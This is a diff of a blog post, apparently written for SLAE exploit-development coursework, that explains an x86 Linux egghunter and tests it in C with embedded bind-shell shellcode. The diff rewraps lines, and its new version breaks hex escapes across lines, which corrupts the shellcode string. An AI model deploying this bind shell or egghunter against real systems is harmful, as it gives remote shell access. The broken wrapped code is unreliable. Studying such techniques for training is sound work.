@@ -12,13 +12,15 @@ en: true
 These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE certification. Today we are going to have a close 
 look at Egghunters. 
 
-An Egghunter is a form of malware, commonly used during Exploit-Development sessions in order to process bigger shellcode when there is low space available. The process is quite simple, this will search for a specific tag within the memory. When found, the flow will be passed upon the instructions following the tag, executing the original shellcode. 
+An Egghunter is a form of malware, commonly used during Exploit-Development sessions in order to process bigger shellcode when there is low space available. The process is quite 
+simple, this will search for a specific tag within the memory. When found, the flow will be passed upon the instructions following the tag, executing the original shellcode. 
 
 The third assignment from the seven requires the creation of an Egghunter through the Assembly language, and converting such into [shellcode](https://es.wikipedia.org/wiki/Shellcode). Moreover, it is required to test such.
 
 ##### Methods
 
-In order to create an Egghunter shellcode, there are several paths. However, as the time goes on, newer techniques are implemented that make shellcoding easier. I have chosen to cover a modern method which is fast, and tends to be very small regarding size. This method obeys the following procedure:
+In order to create an Egghunter shellcode, there are several paths. However, as the time goes on, newer techniques are implemented that make shellcoding easier. I have chosen to 
+cover a modern method which is fast, and tends to be very small regarding size. This method obeys the following procedure:
 
 + The tag is saved on ESI
 + EBX is incremented
@@ -26,7 +28,8 @@ In order to create an Egghunter shellcode, there are several paths. However, as 
 + Repeat this process through a jump if not zero (JNZ) condition.
 + Jump into EBX.
 
-It is quite important to note that the tag does not contain an opocode that could interfere with our egghunter, such as an INC ESI (46), or DEC EBX (4B). The chosen tag is 45474547 (GEGE).
+It is quite important to note that the tag does not contain an opocode that could interfere with our egghunter, such as an INC ESI (46), or DEC EBX (4B). The chosen tag is 
+45474547 (GEGE).
 
 Code:
 
@@ -82,7 +85,8 @@ Egg size:  12
 $
 ```
 
-Furthermore, there is an additional detail that the egghunter should be configurable for different payloads. As the only requirement is to leave the tag at the start of the payload, configuration for different shellcodes should be easy.
+Furthermore, there is an additional detail that the egghunter should be configurable for different payloads. As the only requirement is to leave the tag at the start of the 
+payload, configuration for different shellcodes should be easy.
 
 Let's test this egghunter within the C format once again. I will now use the bind shell developed during [this](https://whitecr0wz.github.io/posts/SLAE-Bind/) post.
 
@@ -95,7 +99,9 @@ unsigned char egg[] = \
 
 unsigned char code[] = \
 "\x47\x45\x47\x45"
-"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\x68\x67\x01\x66\x58\xb3\x02\xb1\x01\x52\xcd\x80\x89\xc6\x66\x68\x69\x01\x66\x58\x89\xf3\x52\x52\x66\x68\x23\x28\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66\x68\x6b\x01\x66\x58\x89\xf3\x31\xc9\x51\xcd\x80\x66\x68\x6c\x01\x66\x58\x89\xf3\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x66\x6a\x3f\x66\x58\x89\xf3\xfe\xc9\xcd\x80\x75\xf3\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x66\x6a\x0b\x66\x58\xcd\x80";
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\x68\x67\x01\x66\x58\xb3\x02\xb1\x01\x52\xcd\x80\x89\xc6\x66\x68\x69\x01\x66\x58\x89\xf3\x52\x52\x66\x68\x23\x28\x66\x6a\x02\x89\xe1
+\xb2\x10\xcd\x80\x66\x68\x6b\x01\x66\x58\x89\xf3\x31\xc9\x51\xcd\x80\x66\x68\x6c\x01\x66\x58\x89\xf3\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x66\x6a\x3f\x66\x58\x89\xf3\
+xfe\xc9\xcd\x80\x75\xf3\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x66\x6a\x0b\x66\x58\xcd\x80";
 
 main()
 {
